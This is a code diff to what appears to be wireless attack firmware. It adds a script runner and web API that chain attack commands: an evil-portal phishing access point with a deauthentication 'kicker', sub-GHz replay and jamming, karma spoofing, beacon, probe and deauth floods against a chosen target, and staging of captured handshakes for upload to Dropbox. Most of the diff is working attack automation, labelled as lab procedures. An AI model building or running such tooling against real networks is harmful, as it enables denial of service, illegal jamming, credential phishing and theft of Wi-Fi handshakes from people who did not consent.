@@ -110,6 +110,7 @@ using fs::File;
 #include "evil_portal.h"
 #include "stream_pcap.h"
 #include "subghz.h"
+#include "script_runner.h"
 #include "gps_service.h"
 #include "hypercube_widget.h"
 #include "wpasec_client.h"
@@ -9457,6 +9458,7 @@ static String neonPageStart(const String& title,
   html += neonNavLink("/portal", "Evil Portal", activeNav);
   html += neonNavLink("/stream", "Live Stream", activeNav);
   html += neonNavLink("/subghz", "Sub-GHz", activeNav);
+  html += neonNavLink("/scripts", "Scripts", activeNav);
   html += "</nav></header><main class='nd-main'>";
   return html;
 }
@@ -9488,6 +9490,23 @@ static String neonPageEnd() {
 </script></body></html>)HTML";
 }
 
+// G6 — shared stage/sync helpers (used by the web API and script runner).
+static AnalyzerSync::StageParams buildStageParamsFromContext() {
+  AnalyzerSync::StageParams p{};
+  p.capture_dir     = captureDir[0] ? captureDir : "";
+  p.module          = autoModeStr(autoMode);
+  p.ssid            = hasTarget ? target.ssid.c_str()  : "";
+  p.bssid           = hasTarget ? target.bssid.c_str() : "";
+  p.channel         = hasTarget ? target.channel       : 0;
+  p.security        = hasTarget ? authToStr(target.auth) : "";
+  p.pmkid_count     = (int)specterPmkidCount;
+  p.handshake_count = (int)capturedHandshakes;
+  p.crackable_handshakes = (int)YoinkEngine::getCrackableHandshakeCount();
+  p.has_target      = hasTarget;
+  p.dropbox_folder  = cfg.dropbox_folder;
+  return p;
+}
+
 // G1 — start the evil portal while suspending the management web UI
 // (the portal owns the WiFi stack). Restores the UI if start fails.
 static bool portalStartSuspendUi(EvilPortal::Config& cfg) {
@@ -9503,6 +9522,153 @@ static bool portalStartSuspendUi(EvilPortal::Config& cfg) {
   }
   return ok;
 }
+
+// G6 — script command dispatch. Runs in loop() context via ScriptRunner::tick().
+namespace ScriptRunner {
+bool execCommand(const String& cmd, const std::vector<String>& args) {
+  if (cmd == "portal") {
+    if (args.size() < 1) return false;
+    if (args[0] == "stop") { evil_portal_obj.stop(); return true; }
+    if (args[0] == "start") {
+      EvilPortal::Config cfg{};
+      String ssid = args.size() > 1 ? args[1]
+                    : (hasTarget ? target.ssid : String("LAB-PORTAL"));
+      strncpy(cfg.ssid, ssid.c_str(), sizeof(cfg.ssid) - 1);
+      int ch = args.size() > 2 ? args[2].toInt() : 0;
+      cfg.channel = (uint8_t)(ch >= 1 && ch <= 14 ? ch
+                              : (hasTarget ? target.channel : 6));
+      int dur = args.size() > 3 ? args[3].toInt() : 0;
+      cfg.durationSec = (uint16_t)(dur > 0 ? dur : 0);
+      cfg.deauthKicker = args.size() > 4 && args[4] == "kicker";
+      if (cfg.deauthKicker && hasTarget) {
+        uint8_t kb[6] = {0};
+        if (macFromString(target.bssid.c_str(), kb)) memcpy(cfg.targetBssid, kb, 6);
+        else cfg.deauthKicker = false;
+        cfg.targetChannel = (uint8_t)target.channel;
+      }
+      return portalStartSuspendUi(cfg);
+    }
+    return false;
+  }
+  if (cmd == "subghz") {
+    if (args.size() < 1) return false;
+    float f = args.size() > 1 ? args[1].toFloat() : 433.92f;
+    if (args[0] == "scan")        return SubGhz::startScan(430.0f, 440.0f, 0.2f);
+    else if (args[0] == "rx")    return SubGhz::startRx(f);
+    else if (args[0] == "replay")return SubGhz::startReplay(f, 3);
+    else if (args[0] == "jam")   return SubGhz::startJam(f, 10000);
+    else if (args[0] == "stop")  { SubGhz::stop(); return true; }
+    return false;
+  }
+  if (cmd == "stage") {
+    bool sdOk = sdReady || mountSdCard(false);
+    if (!sdOk) return false;
+    return AnalyzerSync::stageSession(SD, buildStageParamsFromContext());
+  }
+  if (cmd == "sync") {
+    if (cfg.dropbox_token.isEmpty()) return false;
+    bool sdOk = sdReady || mountSdCard(false);
+    if (!sdOk) return false;
+    if (AnalyzerSync::g_state.session_id[0] == '\0') return false;
+    return AnalyzerSync::uploadSession(SD, cfg.dropbox_token.c_str(),
+                                       cfg.dropbox_folder);
+  }
+  if (cmd == "scan") {
+    // scan — blocking AP scan, fills aps[]/apCount for `target` to pick from.
+    // Refused while the portal owns the WiFi stack.
+    if (evil_portal_obj.running()) return false;
+    doWifiScanBlocking();
+    Serial.printf("[script] scan complete: %d APs\n", apCount);
+    return true;
+  }
+  if (cmd == "target") {
+    // target <ssid> [bssid] [channel] — lock the working target. Prefers a
+    // scanned AP entry so bssid/channel/auth are real.
+    if (args.size() < 1 || args[0].length() == 0) return false;
+    bool matched = false;
+    for (int i = 0; i < apCount; i++) {
+      if (aps[i].ssid == args[0]) { target = aps[i]; matched = true; break; }
+    }
+    if (!matched) {
+      target.ssid = args[0];
+      if (args.size() > 1) target.bssid = args[1];
+      if (args.size() > 2) {
+        int ch = args[2].toInt();
+        if (ch >= 1 && ch <= 14) target.channel = (uint8_t)ch;
+      }
+    }
+    hasTarget = true;
+    Serial.printf("[script] target locked: %s\n", target.ssid.c_str());
+    return true;
+  }
+  if (cmd == "capture") {
+    // capture <module> <seconds> — time-bounded, non-blocking Packet Lab
+    // attacks (they tick in loop(); pair with `delay` + `stage`).
+    if (evil_portal_obj.running()) return false;
+    if (args.size() < 2) return false;
+    int dur = args[1].toInt();
+    if (dur < 5) dur = 5;
+    if (dur > 600) dur = 600;
+    uint16_t ms = (uint16_t)(dur * 1000);
+    uint8_t ch = hasTarget ? target.channel : 6;
+    const char* ssid = hasTarget ? target.ssid.c_str() : "LAB";
+    if (args[0] == "karma") {
+      PACKETLABStartKarma(ch, ms);
+      return true;
+    }
+    if (args[0] == "probe") {
+      PACKETLABStartProbeFlood(ssid, ch, ms);
+      return true;
+    }
+    if (args[0] == "beacon") {
+      PACKETLABStartBeaconSpam(ssid, ch, ms);
+      return true;
+    }
+    if (args[0] == "deauth") {
+      if (!hasTarget) return false;
+      PACKETLABTarget t{};
+      if (!macFromString(target.bssid.c_str(), t.bssid)) return false;
+      strncpy(t.ssid, target.ssid.c_str(), sizeof(t.ssid) - 1);
+      t.channel = target.channel;
+      PACKETLABStartDeauthFlood(t, ms);
+      return true;
+    }
+    return false;
+  }
+  if (cmd == "karma") {
+    if (args.size() < 1) return false;
+    if (args[0] == "stop") {
+      if (PACKETLABGetCurrentAttackType() == PACKETLABAttackType::KARMA)
+        PACKETLABStopAttack();
+      return true;
+    }
+    if (args[0] == "start") {
+      int ch  = args.size() > 1 ? args[1].toInt() : 6;
+      int dur = args.size() > 2 ? args[2].toInt() : 30;
+      if (ch < 1 || ch > 14) ch = 6;
+      if (dur < 5) dur = 5;
+      if (dur > 300) dur = 300;
+      PACKETLABStartKarma((uint8_t)ch, (uint16_t)(dur * 1000));
+      return true;
+    }
+    return false;
+  }
+  if (cmd == "log") {
+    String msg;
+    for (const auto& a : args) { if (msg.length()) msg += ' '; msg += a; }
+    Serial.printf("[script] note: %s\n", msg.c_str());
+    if (AnalyzerSync::g_state.session_id[0])
+      AnalyzerSync::appendEvent(SD, "script_note", "SCRIPT", "info", msg.c_str());
+    return true;
+  }
+  if (cmd == "verdict") {
+    String m = AnalyzerSync::sessionManifestJson(SD, AnalyzerSync::g_state.session_id);
+    Serial.printf("[script] session verdict: %s\n", m.substring(0, 160).c_str());
+    return true;
+  }
+  return false;  // unknown command
+}
+}  // namespace ScriptRunner
 
 static void startWebServer() {
   if (webServerRunning) {
@@ -11469,18 +11635,7 @@ function syncSession()  { apiAction('/api/analyzer/sync',  event.target, 'Synced
         "{\"ok\":false,\"error\":\"SD not available\"}");
       return;
     }
-    AnalyzerSync::StageParams p;
-    p.capture_dir     = captureDir[0] ? captureDir : "";
-    p.module          = autoModeStr(autoMode);
-    p.ssid            = hasTarget ? target.ssid.c_str()  : "";
-    p.bssid           = hasTarget ? target.bssid.c_str() : "";
-    p.channel         = hasTarget ? target.channel       : 0;
-    p.security        = hasTarget ? authToStr(target.auth) : "";
-    p.pmkid_count     = (int)specterPmkidCount;
-    p.handshake_count = (int)capturedHandshakes;
-    p.crackable_handshakes = (int)YoinkEngine::getCrackableHandshakeCount();
-    p.has_target      = hasTarget;
-    p.dropbox_folder  = cfg.dropbox_folder;
+    AnalyzerSync::StageParams p = buildStageParamsFromContext();
 
     bool ok = AnalyzerSync::stageSession(SD, p);
     String out = "{\"ok\":"; out += ok ? "true" : "false";
@@ -11783,6 +11938,79 @@ sgStatus(); setInterval(sgStatus, 3000);
     else if (action == "stop")   { SubGhz::stop(); ok = true; }
     String out = "{\"ok\":"; out += ok ? "true" : "false"; out += "}";
     webServer.send(ok ? 200 : 500, "application/json", out);
+  });
+
+  // G6 — Lab procedure scripts (/neondrive/scripts/*.ndm).
+  // GET /scripts — list + run/stop controls.
+  webServer.on("/scripts", HTTP_GET, [](){
+    String html = neonPageStart("Lab Scripts",
+      "Line-based procedure macros. Every step is logged to the session "
+      "bundle for auditability.", "/scripts");
+    html += "<section class='nd-panel'><h2>Scripts</h2>";
+    html += "<p>Status: <span id='scst'>loading&hellip;</span></p>";
+    html += "<div id='sclist'></div>";
+    html += "<button class='nd-btn-ghost' onclick=\"scGo('/api/scripts/stop', null, 'Stopped')\">Stop</button>";
+    html += "</div></section>";
+    html += R"JS(<script>
+function scGo(url, btn, doneLabel) {
+  fetch(url, { method: 'POST' }).then(function(r){ return r.json(); })
+    .then(function(d){ scStatus(); });
+}
+function scRun(name) {
+  var fd = new FormData(); fd.append('name', name);
+  fetch('/api/scripts/run', { method: 'POST', body: new URLSearchParams(fd) })
+    .then(function(r){ return r.json(); }).then(function(d){ scStatus(); });
+}
+function scStatus() {
+  fetch('/api/scripts/status').then(function(r){ return r.json(); }).then(function(d){
+    var el = document.getElementById('scst');
+    el.textContent = d.running ? ('RUNNING ' + d.script + ' (' + d.steps + ' steps)') : 'IDLE';
+  });
+  fetch('/api/scripts/list').then(function(r){ return r.json(); }).then(function(d){
+    var html = '';
+    for (var i = 0; i < d.length; i++) {
+      html += '<p>' + d[i].name + ' (' + d[i].size + ' B) ' +
+        '<button class="nd-btn" onclick="scRun(\'' + d[i].name + '\')">Run</button></p>';
+    }
+    if (!d.length) html = '<p>No scripts. Add .ndm files to /neondrive/scripts/.</p>';
+    document.getElementById('sclist').innerHTML = html;
+  });
+}
+scStatus(); setInterval(scStatus, 3000);
+</script>)JS";
+    html += neonPageEnd();
+    webServer.send(200, "text/html", html);
+  });
+
+  // GET /api/scripts/list
+  webServer.on("/api/scripts/list", HTTP_GET, [](){
+    bool sdOk = sdReady || mountSdCard(false);
+    webServer.send(sdOk ? 200 : 503, "application/json",
+                   sdOk ? ScriptRunner::listScripts(SD) : "[]");
+  });
+
+  // GET /api/scripts/status
+  webServer.on("/api/scripts/status", HTTP_GET, [](){
+    webServer.send(200, "application/json", ScriptRunner::statusJson());
+  });
+
+  // POST /api/scripts/run — name=<file.ndm>
+  webServer.on("/api/scripts/run", HTTP_POST, [](){
+    bool sdOk = sdReady || mountSdCard(false);
+    if (!sdOk) {
+      webServer.send(503, "application/json",
+        "{\"ok\":false,\"error\":\"SD not available\"}");
+      return;
+    }
+    bool ok = ScriptRunner::runFile(SD, webServer.arg("name").c_str());
+    String out = "{\"ok\":"; out += ok ? "true" : "false"; out += "}";
+    webServer.send(ok ? 200 : 409, "application/json", out);
+  });
+
+  // POST /api/scripts/stop
+  webServer.on("/api/scripts/stop", HTTP_POST, [](){
+    ScriptRunner::stop();
+    webServer.send(200, "application/json", "{\"ok\":true}");
   });
 
   // G4 — Karma attack API (probe-response spoofing).
@@ -18901,6 +19129,9 @@ void loop() {
 
   // G2 — sub-GHz toolkit service (T-Embed CC1101; no-op elsewhere).
   SubGhz::tick();
+
+  // G6 — lab procedure script runner (non-blocking).
+  ScriptRunner::tick();
 
 #if defined(NEONDRIVE_TARGET_BUTTON_NAV)
   if (tdisplayNavConsumeRefreshRequest()) {
